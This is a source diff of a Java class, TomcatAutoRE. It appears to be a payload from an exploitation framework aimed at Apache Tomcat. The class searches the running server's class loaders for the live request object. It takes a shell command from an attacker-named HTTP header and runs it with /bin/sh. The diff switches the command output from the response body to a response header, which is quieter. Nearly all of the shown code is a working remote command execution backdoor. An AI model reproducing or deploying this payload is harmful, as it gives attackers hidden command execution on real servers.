@@ -15,31 +15,38 @@ import java.util.*;
  */
 @Middleware(Middleware.Tomcat)
 @JavaClassType(JavaClassType.AutoFind)
-@JavaClassModifiable({JavaClassModifiable.HEADER})
+@JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.RHEADER})
 public class TomcatAutoRE {
     private static String HEADER;
+    private static String RHEADER;
+
+    public TomcatAutoRE(Object o) {
+
+    }
 
     public TomcatAutoRE() {
         try {
             Object request = getTargetObject("org.apache.coyote.Request");
             Object response = invokeMethod(request, "getResponse", new Class[]{}, new Object[]{});
 
-            Object header = invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
-
-            String result = exec((String) header);
-            invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
-            try {
-                invokeMethod(response, "doWrite", new Class[]{java.nio.ByteBuffer.class}, new Object[]{java.nio.ByteBuffer.wrap(result.getBytes())});
-            } catch (Exception e) {
-                Class clazz;
-                try {
-                    clazz = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
-                } catch (ClassNotFoundException e1) {
-                    clazz = request.getClass().getClassLoader().loadClass("org.apache.tomcat.util.buf.ByteChunk");
-                }
-                Object byteChunk = clazz.newInstance();
-                invokeMethod(clazz, byteChunk, "setBytes", new Class[]{byte[].class, Integer.TYPE, Integer.TYPE}, new Object[]{result.getBytes(), 0, result.getBytes().length});
-                invokeMethod(response, "doWrite", new Class[]{clazz}, new Object[]{byteChunk});
+            String header = (String) invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
+            if (header != null && !header.isEmpty()) {
+                String result = exec(header);
+                invokeMethod(response, "setHeader", new Class[]{String.class, String.class}, new Object[]{RHEADER, result});
+//            invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
+//            try {
+//                invokeMethod(response, "doWrite", new Class[]{java.nio.ByteBuffer.class}, new Object[]{java.nio.ByteBuffer.wrap(result.getBytes())});
+//            } catch (Exception e) {
+//                Class clazz;
+//                try {
+//                    clazz = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
+//                } catch (ClassNotFoundException e1) {
+//                    clazz = request.getClass().getClassLoader().loadClass("org.apache.tomcat.util.buf.ByteChunk");
+//                }
+//                Object byteChunk = clazz.newInstance();
+//                invokeMethod(clazz, byteChunk, "setBytes", new Class[]{byte[].class, Integer.TYPE, Integer.TYPE}, new Object[]{result.getBytes(), 0, result.getBytes().length});
+//                invokeMethod(response, "doWrite", new Class[]{clazz}, new Object[]{byteChunk});
+//            }
             }
         } catch (Exception e) {
         }
@@ -53,10 +60,8 @@ public class TomcatAutoRE {
             cmd = new String[]{"/bin/sh", "-c", str};
         }
         InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
-        return exec_result(inputStream);
-    }
 
-    public static String exec_result(InputStream inputStream) throws Exception {
+        // result
         byte[] bytes = new byte[1024];
         int len;
         StringBuilder stringBuilder = new StringBuilder();
@@ -86,7 +91,7 @@ public class TomcatAutoRE {
     public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
         try {
             return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
-        }catch (Exception e){
+        } catch (Exception e) {
             return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
         }
     }
@@ -99,12 +104,29 @@ public class TomcatAutoRE {
     }
 
     public static Object getTargetObject(String className) throws Exception {
-        List<ClassLoader> activeClassLoaders = new TomcatAutoRE().getActiveClassLoaders();
+        List<ClassLoader> activeClassLoaders = new TomcatAutoRE(null).getActiveClassLoaders();
 
         Class cls = getTargetClass(className, activeClassLoaders);
 
         // 死亡区域 已检查过的类
         HashSet breakObject = new HashSet();
+        breakObject.add(int.class.getName());
+        breakObject.add(short.class.getName());
+        breakObject.add(long.class.getName());
+        breakObject.add(double.class.getName());
+        breakObject.add(byte.class.getName());
+        breakObject.add(float.class.getName());
+        breakObject.add(char.class.getName());
+        breakObject.add(boolean.class.getName());
+        breakObject.add(Integer.class.getName());
+        breakObject.add(Short.class.getName());
+        breakObject.add(Long.class.getName());
+        breakObject.add(Double.class.getName());
+        breakObject.add(Byte.class.getName());
+        breakObject.add(Float.class.getName());
+        breakObject.add(Character.class.getName());
+        breakObject.add(Boolean.class.getName());
+        breakObject.add(String.class.getName());
         breakObject.add(System.identityHashCode(breakObject));
 
         // 原始类型和包装类都不递归
